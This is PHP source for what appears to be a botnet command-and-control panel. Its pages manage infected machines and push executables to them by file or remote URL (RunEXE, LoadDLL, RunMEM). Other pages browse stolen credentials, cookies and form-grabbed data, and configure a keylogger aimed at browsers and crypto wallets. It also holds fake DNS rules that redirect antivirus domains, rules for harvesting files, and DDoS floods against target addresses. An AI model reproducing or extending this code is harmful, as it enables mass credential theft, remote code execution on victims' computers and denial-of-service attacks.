	if (($config["admin"] === "admin") && ($config["pass"] === "admin")) $error .= "<li>change admin password in \"/inc/cfg.php\" file</li>";
	if (($config["guest"] === "guest")) $error .= "<li>change guest secret in \"/inc/cfg.php\" file</li>";
	if (encryptkey == 0) $error .= "<li>set \"encryptkey\" in \"/inc/cfg.php\" file</li>";
	if (decryptkey == 0) $error .= "<li>set \"decryptkey\" in \"/inc/cfg.php\" file</li>";
	if ((int)PHP_VERSION_ID < 50538) $error .= "<li>use PHP 5.5.38 or newer</li>";
	if (return_bytes(ini_get('upload_max_filesize')) < 32 * 1024 * 1024) $error .= "<li>low value for \"upload_max_filesize\", change it in php.ini (32M)</li>";
	if (return_bytes(ini_get('post_max_size')) < 32 * 1024 * 1024) $error .= "<li>low value for \"post_max_size\", change it in php.ini (32M)</li>";	
	if (strlen($error) > 10) echo "<div id=\"secissues\" style=\"display: block;\"><span style=\"font-weight:bold;text-transform:uppercase;padding:3px;background-color:#fca9a9;\">Attention!!! Panel has next security issues:</span><ul style=\"padding:3px;list-style:none;\">{$error}</ul><span style=\"font-weight:bold;text-transform:uppercase;padding:3px;background-color:#afffb5;\">Please make changes and refresh page!</span></div>";
	echo "
	<table id=\"info\">
		<tr>
			<th align=\"center\">Statistic</th>
			<th align=\"center\">OS</th>
			<th align=\"center\">Privileges</th>
			<th align=\"center\">Sellers</th>
			<th align=\"center\">Online Sellers</th>
			<th align=\"center\">Online Countries</th>
			<th align=\"center\">Countries</th>
		</tr>
		<tr>
			<td align=\"left\">All Bots - ".bots()."<br>Today - ".tdbots()."<br>Online - ".onbots()."<br><br>Tasks - ".tasks()."<br><br>Loads - ".loads()."<br>Runs - ".runs()."<br><br>".forupd()."<br>Installed - ".installed();
			if ($ddos_state) echo "<br><br>On DDoS - ".onddos();
	echo "</td>
			<td align=\"center\">".os()."</td>
			<td align=\"center\">".privileges()."</td>
			<td align=\"center\">".sellers()."</td>
			<td align=\"center\">".onsellers()."</td>
			<td align=\"center\"><a class=\"action\" href=\"javascript:look('div1');\">Show/Hide</a><div id=\"div1\" style=\"display:none\">".oncountries()."</div></td>
			<td align=\"center\"><a class=\"action\" href=\"javascript:look('div2');\">Show/Hide</a><div id=\"div2\" style=\"display:none\">".countries()."</div></td>
		</tr>
		<tr>
			<th colspan=\"7\" align=\"center\">Last Bots</th>
		</tr>
		<tr>
			<td colspan=\"7\" align=\"center\"><a class=\"action\" href=\"javascript:look('div3');\">Show/Hide</a><div id=\"div3\" style=\"display:none\">".lastbots()."</div></td>
		</tr>
	</table>";
} elseif ($page === "bots"){
	$botlist = "";
	$sr_htv = "";
	if ($htv_state){
		$botlist_cols = 12;
		$sr_htv = "<input type=\"hidden\" name=\"sr_htv\" value=\"1\">";
	} else $botlist_cols = 10;
	if ($_GET["mode"] === "search") $botlist = sr_allbots(); else $botlist = allbots($next,$htv_state);
	$botlist_tab = "
	<table id=\"bots\">
		<tr>
			<th align=\"center\" colspan=\"{$botlist_cols}\">Bot List</th>
		</tr>
		<tr>
			<td colspan=\"{$botlist_cols}\" align=\"left\">
				<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
					ID (pattern): <input type=\"input\" name=\"sr_pattern\" size=\"50\"> IP: <input type=\"input\" name=\"sr_ip\"> Country: <input type=\"input\" name=\"sr_geo\" size=\"3\" maxlength=\"2\"> Seller: <input type=\"input\" name=\"sr_seller\" size=\"8\" maxlength=\"5\"><input type=\"hidden\" name=\"mode\" value=\"search\">{$sr_htv}<input type=\"submit\" value=\"SEARCH\"><br><br>
				</form>
			</td>
		</tr>
		<tr>
			<th align=\"center\">ID</th>
			<th align=\"center\">IP</th>
			<th align=\"center\">Proxy IP</th>
			<th align=\"center\">Computer Name</th>
			<th align=\"center\">OS</th>
			<th align=\"center\">Last Visit</th>
			<th align=\"center\">Country</th>
			<th align=\"center\">Seller</th>
			<th align=\"center\">Privileges</th>";
			if ($htv_state) $botlist_tab .= "<th align=\"center\">RPC ID</th><th align=\"center\">RPC PASS</th>";
			$botlist_tab .= "
			<th align=\"center\">Action</th>
		</tr>{$botlist}
		<tr class=\"bottom\">
			<td colspan=\"{$botlist_cols}\" align=\"center\"><div><a class=\"action\" href=\"?act=delbots\" onclick=\"return confirm('Are you sure?')\">Delete all bots</a> | <a class=\"action\" href=\"?act=canceldelbots\" onclick=\"return confirm('Are you sure?')\">Cancel bots deletion</a></div></td>
		<tr>
	</table>";
	echo $botlist_tab."
	<div id=\"personal\" style=\"display: none;\">
		<div align=\"right\"><a href=\"#\" onclick=\"showdiv('personal'); return false\">Close</a></div>
			<table id=\"task\">
				<tr>
					<th align=\"center\">Add personal task</th>
				</tr>
				<tr>
					<th align=\"center\">Local file</th>
				</tr>
				<tr>
					<td align=\"left\">
						<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
							<input type=\"hidden\" id=\"botid_num1\" name=\"botid\" value=\"0\">
							<input type=\"file\" name=\"file\">
							<input type=\"submit\" value=\"UPLOAD\"><br><br>
								<table cols=\"4\" width=\"400px\">Options:
									<tr>
										<td><input type=\"radio\" name=\"start\" value=\"0\" checked>RunEXE</td>
										<td><input type=\"radio\" name=\"start\" value=\"1\">LoadDLL</td>
										<td><input type=\"radio\" name=\"start\" value=\"2\">regsvr32</td>
										<td><input type=\"radio\" name=\"start\" value=\"3\">RunMEM</td>
										<td><input type=\"radio\" name=\"start\" value=\"4\">RunBAT</td>
									</tr>
								</table>
						</form>
					</td>
				</tr>
				<tr>
					<th align=\"center\">Remote file</th>
				</tr>
				<tr>
					<td align=\"left\">
						<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
							<input type=\"hidden\" id=\"botid_num2\" name=\"botid\" value=\"0\">
							URL: <input type=\"input\" name=\"url\">
							<input type=\"submit\" value=\"SET\"><br><br>
								<table cols=\"4\" width=\"400px\">Options:
									<tr>
										<td><input type=\"radio\" name=\"start\" value=\"0\" checked>RunEXE</td>
										<td><input type=\"radio\" name=\"start\" value=\"1\">LoadDLL</td>
										<td><input type=\"radio\" name=\"start\" value=\"2\">regsvr32</td>
										<td><input type=\"radio\" name=\"start\" value=\"3\">RunMEM</td>
										<td><input type=\"radio\" name=\"start\" value=\"4\">RunBAT</td>
									</tr>
								</table>
						</form>
					</td>
				</tr>
			</table>
	</div>";
} elseif ($page === "tasks"){
	echo "
	<table id=\"task\">
		<tr>
			<th align=\"center\" colspan=\"15\">Task list</th>
		</tr>
		<tr>
			<th align=\"center\">ID</th>
			<th align=\"center\">Size</th>
			<th align=\"center\">Date</th>
			<th align=\"center\">Loads</th>
			<th align=\"center\">Runs</th>
			<th align=\"center\">Action</th>
			<th align=\"center\">Limit</th>
			<th align=\"center\">URL</th>
			<th align=\"center\">GEO</th>
			<th align=\"center\">Run Type</th>
			<th align=\"center\">Bits</th>
			<th align=\"center\">Delete bot</th>
			<th align=\"center\">Comment</th>
			<th align=\"center\">Seller</th>
			<th align=\"center\">Guest</th>
		</tr>".allexe()."
		<tr class=\"bottom\"><td colspan=\"15\"</td></tr>
		<tr>
			<th align=\"center\" colspan=\"15\">Add new task</th>
		</tr>
		<tr>
			<td align=\"center\" colspan=\"15\">
				<table id=\"task\">
					<tr>
						<th align=\"center\">Local file</th>
						<th align=\"center\">Remote file</th>
					</tr>
					<tr>
						<td align=\"left\">
							<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
								Comment: <input type=\"input\" name=\"comment\"><br><br>
								GEO: <input type=\"input\" name=\"geo\" value=\"ALL\"> <br>(for allow: ru,us,gb; for deny RU: all,!ru)<br><br>
								Limit: <input type=\"input\" name=\"limit\" value=\"0\" size=\"8\" maxlength=\"7\"> Seller: <input type=\"input\" name=\"seller\" value=\"0\" size=\"8\" maxlength=\"5\"><br><br>
								<input type=\"file\" name=\"file\">
								<input type=\"submit\" value=\"UPLOAD\"><br><br>
								<table cols=\"5\">Options:
									<tr>
										<td><input type=\"radio\" name=\"start\" value=\"0\" checked>RunEXE</td>
										<td><input type=\"radio\" name=\"start\" value=\"1\">LoadDLL</td>
										<td><input type=\"radio\" name=\"start\" value=\"2\">regsvr32</td>
										<td><input type=\"radio\" name=\"start\" value=\"3\">RunMEM</td>
										<td><input type=\"radio\" name=\"start\" value=\"4\">RunBAT</td>
									</tr>
									<tr>
										<td><input type=\"radio\" name=\"bits\" value=\"0\" checked>x32 & x64</td>
										<td><input type=\"radio\" name=\"bits\" value=\"1\">x32</td>
										<td><input type=\"radio\" name=\"bits\" value=\"2\">x64</td>
										<td></td>
										<td></td>
									</tr>
									<tr>
										<td colspan=\"5\"><input type=\"checkbox\" name=\"delafter\" value=\"1\">Delete bot after complete tasks</td>
									</tr>
								</table>
							</form>
						</td>
						<td align=\"left\">
							<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
								Comment: <input type=\"input\" name=\"comment\"><br><br>
								GEO: <input type=\"input\" name=\"geo\" value=\"ALL\"> <br>(for allow: ru,us,gb; for deny RU: all,!ru)<br><br>
								Limit: <input type=\"input\" name=\"limit\" value=\"0\" size=\"8\" maxlength=\"7\"> Seller: <input type=\"input\" name=\"seller\" value=\"0\" size=\"8\" maxlength=\"5\"><br><br>
								URL: <input type=\"input\" size=\"25\" name=\"url\">
								<input type=\"submit\" value=\"SET\"><br><br>
								<table cols=\"5\">Options:
									<tr>
										<td><input type=\"radio\" name=\"start\" value=\"0\" checked>RunEXE</td>
										<td><input type=\"radio\" name=\"start\" value=\"1\">LoadDLL</td>
										<td><input type=\"radio\" name=\"start\" value=\"2\">regsvr32</td>
										<td><input type=\"radio\" name=\"start\" value=\"3\">RunMEM</td>
										<td><input type=\"radio\" name=\"start\" value=\"4\">RunBAT</td>
									</tr>
									<tr>
										<td><input type=\"radio\" name=\"bits\" value=\"0\" checked>x32 & x64</td>
										<td><input type=\"radio\" name=\"bits\" value=\"1\">x32</td>
										<td><input type=\"radio\" name=\"bits\" value=\"2\">x64</td>
										<td></td>
										<td></td>
									</tr>
									<tr>
										<td colspan=\"5\"><input type=\"checkbox\" name=\"delafter\" value=\"1\">Delete bot after complete tasks</td>
									</tr>
								</table>
							</form>
						</td>
					</tr>
				</table>
			</td>
		</tr>
	</table>";
} elseif ($page === "options"){
	$req = mysqli_query($dbcon,"SELECT * FROM options");
	$res = mysqli_fetch_assoc($req);
	$warn = "";
	if ($res["upd"] === "local") $warn = "<br><div style=\"color:red;\"><b>Local update is started!!!</b></div><br>"; elseif (strlen($res["upd"]) > 10) $warn = "<br><div style=\"color: red;\"><b>Remote update is started!!!<br>From - {$res["upd"]}</b></div><br>";
	echo "
	<table id=\"info\">
		<tr>
			<th align=\"center\">Options</th>
		</tr>
		<tr>
			<td align=\"center\">
				<a class=\"action\" href=\"?opt=delexe\" onclick=\"return confirm('Are you sure?')\">Delete all tasks with files</a> | 
				<a class=\"action\" href=\"?opt=delpers\" onclick=\"return confirm('Are you sure?')\">Delete personal tasks with files</a> | 
				<a class=\"action\" href=\"?opt=delstat\" onclick=\"return confirm('Are you sure?')\">Clear all stats</a> 
			</td>
		</tr>
		<tr>
			<th align=\"center\">Update</th>
		</tr>
		<tr>
			<td><h4>Local file:</h4><br>
				<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
					<input type=\"file\" name=\"updname\">
					<input type=\"submit\" value=\"UPLOAD\">
				</form>
			</td>
		</tr>
		<tr>
			<td><h4>Remote file:</h4><br>
				<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
					URL: <input type=\"input\" name=\"update\">
					<input type=\"submit\" value=\"SET\">
				</form>
			</td>
		</tr>
		<tr>
			<td align=\"center\">{$warn}<br>
				<a class=\"action\" href=\"?opt=delupdate\" onclick=\"return confirm('Are you sure?')\">Delete UPDATE</a>
			</td>
		</tr>
	</table>";
} elseif ($page === "stealer"){
	$showsr = false;
	$reports = "";
	$url_pattern = "";
	$id_pattern = "";
	$per_page = 20;
	if (empty($next)) $next = 1;
	$start = abs(($next - 1) * $per_page);
	if ($_GET["mode"] === "reports"){
		$url_pattern = $_GET["logs_sru"];
		$id_pattern = $_GET["logs_sri"];
		if ($url_pattern !== "" || $id_pattern !== ""){
			$query = "";
			if ($url_pattern !== "") $query .= " AND `host` LIKE '%".mysqli_real_escape_string($dbcon,$url_pattern)."%'";
			if ($id_pattern !== "") $query .= " AND `cname` LIKE '%".mysqli_real_escape_string($dbcon,$id_pattern)."%'";
			$req = mysqli_query($dbcon,"SELECT COUNT(DISTINCT `cname`) FROM `stealer` WHERE 1=1 {$query}");
			$row = mysqli_fetch_row($req);
			$total_rows = $row[0];
			$num_pages = ceil($total_rows / $per_page);
			if ($total_rows > 0){
				$req = mysqli_query($dbcon,"SELECT `cname`,COUNT(*) as `cnt` FROM `stealer` WHERE 1=1 {$query} GROUP BY `cname` ORDER BY `time` DESC LIMIT {$start},{$per_page}");
				while ($res = mysqli_fetch_assoc($req)){
					$reports .= "<tr class=\"blank\"><td align=\"center\" colspan=\"2\">{$res["cname"]}</td><td align=\"center\">{$res["cnt"]}</td><td align=\"center\"><a class=\"action\" target=\"_blank\" href=\"?act=showlog&id={$res["cname"]}\">Logs</a> | <a class=\"action\" target=\"_blank\" href=\"?act=showcookies&id={$res["cname"]}\">Cookies</a> | <a class=\"action\" href=\"?act=dellog&id={$res["cname"]}\" onclick=\"return confirm('Are you sure?')\">Delete</a></td></tr>";
				}
			}
		} else $num_pages = 0;
		$showsr = true;
	} else $showsr = false;
	$action = $_SERVER["PHP_SELF"]."?page=stealer&mode=reports";
	echo "
	<table id=\"bots\">
		<tr>
			<th align=\"center\" colspan=\"4\">Stealer Reports</th>
		</tr>
		<tr>
			<th align=\"center\" colspan=\"2\" style=\"width:50%;\">Top-10 Software</th>
			<th align=\"center\" colspan=\"2\" style=\"width:50%;\">Top-10 Urls</th>
		</tr>
		<tr>
			<td align=\"center\" colspan=\"2\">".stealertopsoft()."</td>
			<td align=\"center\" colspan=\"2\" style=\"text-transform:none;\">".stealertopurls()."</td>
		</tr>
		<tr>
			<th align=\"center\" colspan=\"4\">Total reports in DB: ".totalstealer()."</th>
		</tr>
		<tr>
			<td align=\"left\" colspan=\"4\"><b>Search (pattern):</b><br><br>
				<form method=\"get\" action=\"{$action}\">
					<input type=\"hidden\" name=\"page\" value=\"stealer\">
					<input type=\"hidden\" name=\"mode\" value=\"reports\">
					ID: <input type=\"input\" name=\"logs_sri\" size=\"30\" value=\"{$id_pattern}\"> URL: <input type=\"input\" name=\"logs_sru\" size=\"30\" value=\"{$url_pattern}\">
					<input type=\"hidden\" name=\"next\" value=\"{$next}\">
					<input type=\"submit\" value=\"SEARCH\">
				</form>
			</td>
		</tr>
		<tr>
			<th align=\"center\" colspan=\"2\">ID</th>
			<th align=\"center\">Total</th>
			<th align=\"center\">Action</th>
		</tr>";
	if ($showsr){
		echo $reports;
		if ($num_pages > 1){
			$currentURI = str_replace("&next={$next}","",$_SERVER["REQUEST_URI"]);
			echo "
		<tr class=\"bottom\">
			<td align=\"center\" colspan=\"4\">
				Pages: ".navigate($num_pages,$next,5,$currentURI)."
			</td>
		</tr>";
		}
	} else echo stealerlogs($next);
	echo "
		<tr class=\"bottom\">
			<td align=\"center\" colspan=\"4\"><a class=\"action\" target=\"_blank\" href=\"?act=showalllog\">Show All</a> | <a class=\"action\" target=\"_blank\" href=\"?act=exportlogs\">Export Logs</a> | <a class=\"action\" href=\"?act=delalllog\" onclick=\"return confirm('Are you sure?')\">Delete all reports from DB</a></td>
		</tr>
	</table>";
} elseif ($page === "fgrab"){
	$showsr = false;
	$reports = "";
	$fgcheck = "";
	$url_pattern = "";
	$id_pattern = "";
	$data_pattern = "";
	$per_page = 50;
	if (empty($next)) $next = 1;
	$start = abs(($next - 1) * $per_page);
	if ($_GET["mode"] === "reports"){
		$url_pattern = $_GET["forms_sru"];
		$id_pattern = $_GET["forms_sri"];
		$data_pattern = $_GET["forms_srd"];
		if ($url_pattern !== "" || $id_pattern !== "" || $data_pattern !== ""){
			$query = "";
			if ($url_pattern !== "") $query .= " AND `url` LIKE '%".mysqli_real_escape_string($dbcon,$url_pattern)."%'";
			if ($id_pattern !== "") $query .= " AND `cname` LIKE '%".mysqli_real_escape_string($dbcon,$id_pattern)."%'";
			if ($data_pattern !== "") $query .= " AND `data` LIKE '%".mysqli_real_escape_string($dbcon,$data_pattern)."%'";
			$req = mysqli_query($dbcon,"SELECT COUNT(*) FROM `formgrab` WHERE 1=1 {$query}");
			$row = mysqli_fetch_row($req);
			$total_rows = $row[0];
			$num_pages = ceil($total_rows / $per_page);
				if ($total_rows > 0){
					$req = mysqli_query($dbcon,"SELECT * FROM `formgrab` WHERE 1=1 {$query} ORDER BY `time` DESC LIMIT {$start},{$per_page}");
					while ($res = mysqli_fetch_assoc($req)){
						$id = $res["cname"];
						$browser = htmlspecialchars($res["browser"]);
						$url = htmlspecialchars($res["url"]);
						//$data = urldecode($res["data"]);
						$data = str_replace("&","\r\n",$res["data"]);
						$data = urldecode($data);
						$data = htmlspecialchars($data);
						$ua = htmlspecialchars($res["uagent"]);
						$cookie = htmlspecialchars($res["cookies"]);
						$time = date("d.m.Y H:i:s",$res["time"]);
						$reports .= "Bot ID: {$id}\r\nBrowser: {$browser}\r\nURL: {$url}\r\nUser-Agent: {$ua}\r\nCookie: {$cookie}\r\nDate: {$time}\r\nRequest: \r\n{$data}\r\n\r\n";
					}
				}
		} else $num_pages = 0;
		$showsr = true;
	} else{
		$reports = last5_reports();
		$showsr = false;
	}
	//if (!empty($reports)) $reports = htmlspecialchars($reports);
	$action = $_SERVER["PHP_SELF"]."?page=fgrab&mode=reports";
	$req = mysqli_query($dbcon,"SELECT `fgcookies` FROM `plugins`");
	$res = mysqli_fetch_assoc($req);
	if ($res["fgcookies"] == 1) $fgcheck = "checked";
	echo "
	<table id=\"info\">
		<tr>
			<th align=\"center\">Form Grabber</th>
		</tr>
		<tr>
			<td align=\"left\">
				<form method=\"post\" action=\"\">
					<input type=\"checkbox\" name=\"fgcookies\" value=\"1\" {$fgcheck}>Delete browser cookies and flash cookies (*.sol) at form grabber start
					<input type=\"hidden\" name=\"mode\" value=\"fgcookies_save\">
					<input type=\"submit\" value=\"SAVE\"><br>
					Supporting: MS Edge, MS IE, Firefox, Chrome, Opera
				</form>
				<hr><b>Filter (pattern)</b> (list of URLs which will not collected with \",\" as delimiter, <span style=\"text-transform:none;\">ex.: facebook,twitter,vk.com,vkontakte</span>):<br><br>
				<form method=\"post\" action=\"\">
					<textarea name=\"fgfilter\" style=\"width:100%;\">".fgfilter()."</textarea>
					<input type=\"hidden\" name=\"mode\" value=\"fgfilter_save\">
					<center><input type=\"submit\" value=\"SAVE\"></center>
				</form>
			</td>
		</tr>
		<tr>
			<th align=\"center\">Total reports in DB: ".totalreports()."</th>
		</tr>
		<tr>
			<td align=\"left\"><b>Search (pattern):</b><br><br>
				<form method=\"get\" action=\"{$action}\">
					<input type=\"hidden\" name=\"page\" value=\"fgrab\">
					<input type=\"hidden\" name=\"mode\" value=\"reports\">
					URL: <input type=\"input\" name=\"forms_sru\" size=\"30\" value=\"{$url_pattern}\"> ID: <input type=\"input\" name=\"forms_sri\" size=\"30\" value=\"{$id_pattern}\"> Request: <input type=\"input\" 	name=\"forms_srd\" size=\"30\" value=\"{$data_pattern}\">
					<input type=\"hidden\" name=\"next\" value=\"{$next}\">
					<input type=\"submit\" value=\"SEARCH\">
				</form>
			</td>
		</tr>";
	if (!$showsr){
		echo "
		<tr>
			<th align=\"center\">Last 5 reports</th>
		</tr>
		<tr>
			<td align=\"center\">
				<textarea name=\"reports\" style=\"width:100%;\" rows=\"30\" readonly>{$reports}</textarea>
			</td>
		</tr>";
	} elseif ($showsr){
		echo "
		<tr>
			<th align=\"center\">Search results (max {$per_page} reports per page)</th>
		</tr>
		<tr>
			<td align=\"center\">
				<textarea name=\"reports\" style=\"width:100%;\" rows=\"30\" readonly>{$reports}</textarea>
			</td>
		</tr>
		<tr>
			<td align=\"center\">";
				if ($num_pages > 1){
					$currentURI = str_replace("&next={$next}","",$_SERVER["REQUEST_URI"]);
					echo "<div style=\"width:700px;\">Pages: ";
					echo navigate($num_pages,$next,5,$currentURI);
					echo "</div>";
				}
			echo "</td>
		</tr>";
	}
	echo "
		<tr>
			<td align=\"center\"><a class=\"action\" href=\"?opt=delreports\" onclick=\"return confirm('Are you sure?')\">Delete all reports from DB</a></td>
		</tr>
	</table>";
} elseif ($page === "passsnif"){
	$ftps = "";
	if ($_GET["mode"] == "allftps")	$ftps = "<b>All reports:</b><br><br><textarea name=\"reports\" style=\"width:100%;\" rows=\"50\" cols=\"80\">".getftpslist()."</textarea>"; else $ftps = "<b>Last 50 reports:</b>&nbsp;<a class=\"action\" href=\"{$_SERVER["PHP_SELF"]}?page=passsnif&mode=allftps\">Show all</a><br><br><textarea name=\"reports\" style=\"width:100%;\" rows=\"50\" cols=\"80\">".getftpslist50()."</textarea>";
	echo "
	<table id=\"info\">
		<tr>
			<th align=\"center\">Password Sniffer</th>
		</tr>
		<tr>
			<th align=\"center\">Total reports in DB: ".totalftps()."</th>
		</tr>
		<tr>
			<td>{$ftps}</td>
		</tr>
		<tr>
			<td align=\"center\"><a class=\"action\" href=\"?opt=delftps\" onclick=\"return confirm('Are you sure?')\">Delete all reports from DB</a></td>
		</tr>
	</table>";
} elseif ($page == "fakedns"){
	$req = mysqli_query($dbcon,"SELECT `fakedns_rules` FROM `plugins`");
	$res = mysqli_fetch_assoc($req);
	echo "
	<table id=\"info\">
		<tr>
			<th align=\"center\">Fake DNS Rules</th>
		</tr>
		<tr>
			<td align=\"center\">
				<form method=\"post\" action=\"\">
					<textarea name=\"rules\" style=\"width:100%;\" rows=\"20\" cols=\"80\">{$res["fakedns_rules"]}</textarea>
					<center><input type=\"submit\" value=\"SAVE\"></center>
				</form>
			</td>
		</tr>
		<tr>
			<th align=\"center\">Info</th>
		</tr>
		<tr>
			<td>Syntax:<br><br><span style=\"text-transform:none;\">bitdefender.com=209.85.229.104</span> (one rule in one line)<br><br>For disable - clear all rules and save</td>
		</tr>
	</table>";
} elseif ($page === "filesearch"){
	$req = mysqli_query($dbcon,"SELECT `filesearch_rules` FROM `plugins`");
	$res = mysqli_fetch_assoc($req);
	echo "
	<table id=\"info\">
		<tr>
			<th align=\"center\">File Search Rules</th>
		</tr>
		<tr>
			<td align=\"center\">
				<form method=\"post\" action=\"\">
					<textarea name=\"frules\" style=\"width:100%;\" rows=\"20\" cols=\"80\">{$res["filesearch_rules"]}</textarea>
					<center><input type=\"submit\" value=\"SAVE\"></center>
				</form>
			</td>
		</tr>
		<tr>
			<th align=\"center\">Info</th>
		</tr>
		<tr>
			<td>Syntax:<br><br><span style=\"text-transform:none;\">*.*=1000</span> (where \"*.*\" - mask for files or full name, \"1000\" - max size of file in bytes, one rule in one line)<br><br>Samples:<br><br><span style=\"text-transform:none;\">*.docx=1000000</span> (collect any files with <span style=\"text-transform:none;\">\".docx\"</span> extension with size less than 1000000 bytes ~ 1MB)<br><span style=\"text-transform:none;\">cookies.sqlite=100000</span> (collect only <span style=\"text-transform:none;\">\"cookies.sqlite\"</span> files with size less then 100000 bytes ~ 100KB)<br><span style=\"text-transform:none;\">*cookies*=100000</span> (collect all files with <span style=\"text-transform:none;\">\"cookies\"</span> string in name and with size less then 100000 bytes ~ 100KB)<br><span style=\"text-transform:none;\">*cookies=100000</span> (collect all files which ends with <span style=\"text-transform:none;\">\"cookies\"</span> string in name and with size less then 100000 bytes ~ 100KB)<br><br>For disable - clear all rules and save<br><br>All results saved in \"/files/botid/\" folder as zip archive (use any ftp client or hosting panel for access)
			</td>
		</tr>
	</table>";
} elseif ($page === "procmon"){
	echo "
	<table id=\"task\">
		<tr>
			<th align=\"center\" colspan=\"9\">Process Monitor</th>
		</tr>
		<tr>
			<th align=\"center\" colspan=\"9\">Current Tasks</th>
		</tr>
		<tr>
			<th align=\"center\">ID</b></th>
			<th align=\"center\">Process name</th>
			<th align=\"center\">Type</th>
			<th align=\"center\">Size</th>
			<th align=\"center\">Date</th>
			<th align=\"center\">Success</th>
			<th align=\"center\">URL</th>
			<th align=\"center\">Comment</th>
			<th align=\"center\">Action</th>
		</tr>".allprocmon()."
		<tr class=\"bottom\">
			<td colspan=\"9\"></td>
		</tr>
		<tr>
			<th align=\"center\" colspan=\"9\">Add new task</th>
		</tr>
		<tr>
			<td colspan=\"9\">
				<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
					Process name: <input type=\"input\" name=\"process\"><span style=\"text-transform:none;\">(ex.: notepad.exe)</span> <br><br>
					Type: <select name=\"type\">
						<option selected disabled>Task type</option>
						<option value=\"0\">Download & Execute</option>
						<option value=\"1\">Kill Process</option>
						<option value=\"2\">Reboot PC</option>
					</select>
					Comment: <input type=\"input\" name=\"comment\"> <br><br>
					<input type=\"hidden\" name=\"procmon\" value=\"yes\">
					<b>Local file:</b><input type=\"file\" name=\"file\"><br><br><b>Remote file:</b><input type=\"input\" name=\"url\" size=\"45\"><br><br><center><input type=\"submit\" value=\"ADD TASK\"></center>
				</form>
			</td>
		</tr>
		<tr>
			<th colspan=\"9\" align=\"center\">Info</th>
		</tr>
		<tr>
			<td colspan=\"9\">Kill process and reboot task will be run each time when new process was founded, download and execute will be run once
			</td>
		</tr>
	</table>";
} elseif ($page === "ddos"){
	echo "
	<table id=\"task\">
		<tr>
			<th align=\"center\" colspan=\"5\">DDOS Targets</th>
		</tr>
		<tr>
			<th align=\"center\">ID</th>
			<th align=\"center\">Attack Mode</th>
			<th align=\"center\">Target Address</th>
			<th align=\"center\">State</th>
			<th align=\"center\">Action</th>
		</tr>".ddostask()."
		<tr class=\"bottom\">
			<td align=\"center\" colspan=\"5\"><a class=\"action\" href=\"?act=ddosstopall\">Stop All</a> | <a class=\"action\" href=\"?act=ddosresumeall\">Resume All</a> | <a class=\"action\" href=\"?act=ddosdelall\" onclick=\"return confirm('Are you sure?')\">Delete All</a></td>
		</tr>
		<tr>
			<th align=\"center\" colspan=\"5\">Add New Target</th>
		</tr>
		<tr>
			<td align=\"center\" colspan=\"5\">
				<form method=\"post\" action=\"\">
					<select name=\"ddosmode\">
						<option selected disabled>Attack mode</option>
						<option value=\"http-get\">HTTP GET Flood</option>
						<option value=\"http-post\">HTTP POST Flood</option>
						<option value=\"download\">Download Flood</option>
						<option value=\"udp\">UDP Flood</option>
						<option value=\"syn\">SYN Flood</option>
						<option value=\"tcp\">TCP Flood</option>
						<option value=\"https-get\">HTTPS GET Flood</option>
						<option value=\"http-slw\">HTTP Slowloris Flood</option>
					</select>
					<input type=\"input\" name=\"address\" placeholder=\"Enter target address\" maxlength=\"255\" size=\"45\">
					<input type=\"hidden\" name=\"mode\" value=\"ddos\">
					<input type=\"submit\" value=\"ADD\">
				</form>
				<br>
			</td>
		</tr>
		<tr>
			<th align=\"center\" colspan=\"5\">Info</th>
		</tr>
		<tr>
			<td colspan=\"5\">Syntax for target address:
					<div style=\"text-align:left;text-transform:none;\">
						<br>
						1) HTTP GET,POST,SLOWLORIS,DOWNLOAD FLOOD - http://site.com/script.php or http://site.com/ or http://127.0.0.1/script.php
						<br>
						2) HTTPS GET FLOOD - https://site.com/script.php or https://site.com/ or https://127.0.0.1/script.php
						<br>
						3) UPD,SYN,TCP FLOOD - site.com:21 or 127.0.0.1:3128 (if port not set then used 80 port as default)
					</div>
			</td>
		</tr>
	</table>";
} elseif ($page === "keylog"){
	$req = mysqli_query($dbcon,"SELECT `keylog_rules` FROM `plugins`");
	$res = mysqli_fetch_assoc($req);
	echo "
	<table id=\"info\">
		<tr>
			<th align=\"center\">Keylogger Rules</th>
		</tr>
		<tr>
			<td align=\"center\">
				<form method=\"post\" action=\"\">
					<textarea name=\"klrules\" style=\"width:100%;\" rows=\"20\" cols=\"60\">{$res["keylog_rules"]}</textarea>
					<input type=\"submit\" value=\"SAVE\">
				</form>
			</td>
		</tr>
		<tr>
			<th align=\"center\">Info</th>
		</tr>
		<tr>
			<td>Syntax:<br><br><span style=\"text-transform:none;\">procname1.ext,procname2.ext</span> (where \",\" - separator for each new process for keylogging, allowing to use mask - *)<br><br>Sample:<br><br><span style=\"text-transform:none;\">iexplore.exe,opera.exe,chrome.exe,firefox.exe</span> (keylogger will work only for this processes)<br><span style=\"text-transform:none;\">*electrum*,*wallet*</span> (keylogger will work for any processes which contain this strings in name)<br><br>All results saved in \"/keylogger/botid/\" folder (use any ftp client or hosting panel for access)</td>
		</tr>
	</table>";
} elseif ($page === "egrab"){
	$emails = "";
	if ($_GET["mode"] == "allemails")	$emails = "<b>All reports:</b><br><br><textarea name=\"reports\" style=\"width:100%;\" rows=\"50\" cols=\"80\">".getemailslist()."</textarea>"; else $emails = "<b>Last 50 reports:</b>&nbsp;<a class=\"action\" href=\"{$_SERVER["PHP_SELF"]}?page=egrab&mode=allemails\">Show all</a><br><br><textarea name=\"reports\" style=\"width:100%;\" rows=\"50\" cols=\"80\">".getemailslist50()."</textarea>";
	echo "
	<table id=\"info\">
		<tr>
			<th align=\"center\">Email Grabber</th>
		</tr>
		<tr>
			<th align=\"center\">Total reports in DB: ".totalemails()."</th>
		</tr>
		<tr>
			<td>{$emails}</td>
		</tr>
		<tr>
			<td align=\"center\"><a class=\"action\" href=\"?opt=delemails\" onclick=\"return confirm('Are you sure?')\">Delete all reports from DB</a></td>
		</tr>
	</table>";
} elseif ($page === "domen"){
    

    
  
	echo " 
		<iframe src=\"/domen/index.php\" width=\"600\" height=\"600\">
	";
	
			
			
		
}

else echo "Fuck Yeah!!!";
}
?>
		</div>
</div>
</body>
</html>